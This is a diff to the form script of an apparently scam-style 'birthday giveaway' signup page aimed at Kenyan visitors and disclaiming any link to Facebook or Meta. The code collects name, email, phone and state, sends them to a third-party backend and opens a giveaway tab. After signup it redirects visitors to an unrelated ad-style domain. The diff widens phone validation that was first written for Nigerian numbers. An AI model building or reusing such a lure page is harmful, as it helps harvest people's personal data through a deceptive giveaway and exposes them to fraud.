@@ -134,112 +134,183 @@
 <footer><p>Kenya</p><p>Disclaimer: This website is not affiliated with Facebook or Meta Platforms, Inc.</p></footer>
 <script>
 'use strict';
-// NEW TAB LINK: Paste the full https:// URL between these quotes.
-// Leave empty to submit normally without opening an extra tab.
+
+// Link to open in a new tab when the form is submitted.
 const NEW_TAB_URL = 'https://kpesa.info/Joho-Birthday-Giveaway.html';
-     // OWN BACKEND: After hosting the included backend, enter its full /api/signup URL.
-// Example: https://api.yourdomain.com/api/signup
-// Required: the backend saves the signup and handles email notifications.
+
+// Backend that saves signups and handles email notifications.
 const BACKEND_URL = 'https://rpes.info/launch-list-api/api/signup';
-     
+
 const form = document.getElementById('signup');
 const phone = document.getElementById('phone');
 const fullName = document.getElementById('name');
 const button = document.getElementById('submit');
 const status = document.getElementById('status');
 const originalButtonHTML = button.innerHTML;
+
 button.disabled = false;
+
+// Remove old country-specific phone restrictions.
+phone.removeAttribute('pattern');
+phone.removeAttribute('minlength');
+phone.removeAttribute('maxlength');
+phone.type = 'tel';
+phone.placeholder = 'Phone number, including country code';
+
 if (BACKEND_URL.trim()) {
-  document.getElementById('privacy-text').textContent = 'Your name, email, phone number and state.';
+  document.getElementById('privacy-text').textContent =
+    'Your name, email, phone number and state.';
 }
+
 function normalizedPhone(value) {
-  const cleaned = value.replace(/[\s()-]/g, '');
-  if (/^0[789]\d{9}$/.test(cleaned)) return '+234' + cleaned.slice(1);
-  if (/^\+?234[789]\d{9}$/.test(cleaned)) return '+' + cleaned.replace(/^\+/, '');
-  return '';
+  // Remove common formatting characters.
+  const cleaned = value.trim().replace(/[\s().-]/g, '');
+
+  // Accept local or international numbers containing 7–15 digits.
+  // Preserve any country code or leading zero.
+  if (!/^\+?\d{7,15}$/.test(cleaned)) return '';
+
+  return cleaned;
 }
+
 function validatePhone() {
-  phone.setCustomValidity(phone.value && !normalizedPhone(phone.value) ? 'Enter a valid Kenyan mobile number, such as 08012345678 or +2348012345678.' : '');
+  phone.setCustomValidity(
+    phone.value && !normalizedPhone(phone.value)
+      ? 'Enter a phone number containing 7–15 digits. You may include a country code, such as +254 or +234.'
+      : ''
+  );
 }
+
 function validateName() {
-  fullName.setCustomValidity(fullName.value && !fullName.value.trim() ? 'Please enter your name.' : '');
+  fullName.setCustomValidity(
+    fullName.value && !fullName.value.trim()
+      ? 'Please enter your name.'
+      : ''
+  );
 }
+
 phone.addEventListener('input', validatePhone);
 fullName.addEventListener('input', validateName);
+
 form.addEventListener('submit', async (event) => {
   event.preventDefault();
-  if (button.disabled) { event.preventDefault(); return; }
+
+  if (button.disabled) return;
+
   status.textContent = '';
   status.style.color = '';
   status.style.background = '';
-  validatePhone(); validateName();
-  if (!form.reportValidity()) { event.preventDefault(); return; }
+
+  validatePhone();
+  validateName();
+
+  if (!form.reportValidity()) return;
+
   if (!BACKEND_URL.trim()) {
-    event.preventDefault();
-    status.textContent = 'This signup form is not open yet. Please check back soon.';
+    status.textContent =
+      'This signup form is not open yet. Please check back soon.';
     return;
   }
+
   fullName.value = fullName.value.trim();
   phone.value = normalizedPhone(phone.value);
-  // Open synchronously from the valid submission to retain the user gesture.
-  // This opens alongside submission, not after confirmed delivery.
-  // A blocked popup or bad URL must not stop the normal form POST.
+
+  // Open directly from the submission gesture.
   if (NEW_TAB_URL.trim()) {
     try {
       const destination = new URL(NEW_TAB_URL.trim());
-      if (destination.protocol === 'https:' || destination.protocol === 'http:') {
-        window.open(destination.href, '_blank', 'noopener,noreferrer');
+
+      if (
+        destination.protocol === 'https:' ||
+        destination.protocol === 'http:'
+      ) {
+        window.open(
+          destination.href,
+          '_blank',
+          'noopener,noreferrer'
+        );
       }
-    } catch (_) { /* Continue submitting if the configured URL is invalid. */ }
-  }
-  button.disabled = true;
-  button.textContent = 'Continuing…';
-  if (BACKEND_URL.trim()) {
-    const controller = new AbortController();
-    const timeout = setTimeout(() => controller.abort(), 25000);
-    try {
-      const endpoint = new URL(BACKEND_URL.trim());
-      if (endpoint.protocol !== 'https:' && !['localhost', '127.0.0.1'].includes(endpoint.hostname)) {
-        throw new Error('HTTPS is required');
-      }
-      const response = await fetch(endpoint.href, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        credentials: 'omit',
-        signal: controller.signal,
-        body: JSON.stringify({
-          name: fullName.value,
-          email: document.getElementById('email').value.trim(),
-          phone: phone.value,
-          state: document.getElementById('state').value,
-          country: 'Kenya',
-          consent: form.querySelector('[name="contact_consent"]').checked
-        })
-      });
-      const result = await response.json();
-      if (!response.ok || result.ok !== true) {
-        status.textContent = result.error || 'We could not save your details. Please try again.';
-        return;
-      }
-      form.reset();
-      status.textContent = 'You’re on the list! We’ll keep you updated.';
-      status.style.color = '#195b42';
-      status.style.background = '#edf6e7';
-      window.location.assign('https://hai8g.com/4/8631702');
     } catch (_) {
-      status.textContent = 'We could not confirm your signup. Please check your connection and try again.';
-    } finally {
-      clearTimeout(timeout);
-      button.disabled = false;
-      button.innerHTML = originalButtonHTML;
+      // Continue submitting if the extra link is invalid.
     }
   }
+
+  button.disabled = true;
+  button.textContent = 'Continuing…';
+
+  const controller = new AbortController();
+  const timeout = setTimeout(() => controller.abort(), 25000);
+
+  try {
+    const endpoint = new URL(BACKEND_URL.trim());
+
+    if (
+      endpoint.protocol !== 'https:' &&
+      !['localhost', '127.0.0.1'].includes(endpoint.hostname)
+    ) {
+      throw new Error('HTTPS is required');
+    }
+
+    const response = await fetch(endpoint.href, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      credentials: 'omit',
+      signal: controller.signal,
+      body: JSON.stringify({
+        name: fullName.value,
+        email: document.getElementById('email').value.trim(),
+        phone: phone.value,
+        state: document.getElementById('state').value,
+        country: 'Kenya',
+        consent: form.querySelector(
+          '[name="contact_consent"]'
+        ).checked
+      })
+    });
+
+    // Handle unexpected non-JSON server responses.
+    let result;
+
+    try {
+      result = await response.json();
+    } catch (_) {
+      status.textContent =
+        'The server returned an unexpected response. Please try again.';
+      return;
+    }
+
+    if (!response.ok || !result || result.ok !== true) {
+      status.textContent =
+        (result && result.error) ||
+        'We could not save your details. Please try again.';
+      return;
+    }
+
+    form.reset();
+
+    status.textContent = 'You’re on the list! We’ll keep you updated.';
+    status.style.color = '#195b42';
+    status.style.background = '#edf6e7';
+
+    window.location.assign('https://hai8g.com/4/8631702');
+  } catch (_) {
+    status.textContent =
+      'We could not confirm your signup. Please check your connection and try again.';
+  } finally {
+    clearTimeout(timeout);
+    button.disabled = false;
+    button.innerHTML = originalButtonHTML;
+  }
 });
+
 window.addEventListener('pageshow', () => {
   button.disabled = false;
   button.innerHTML = originalButtonHTML;
 });
 </script>
+  
   <!-- BEGIN: Powered by Supercounters.com -->
 <center><script type="text/javascript" src="//widget.supercounters.com/ssl/online_i.js"></script><script type="text/javascript">sc_online_i(1739161,"ffffff","ffffff");</script><!-- END: Powered by Supercounters.com -->
 
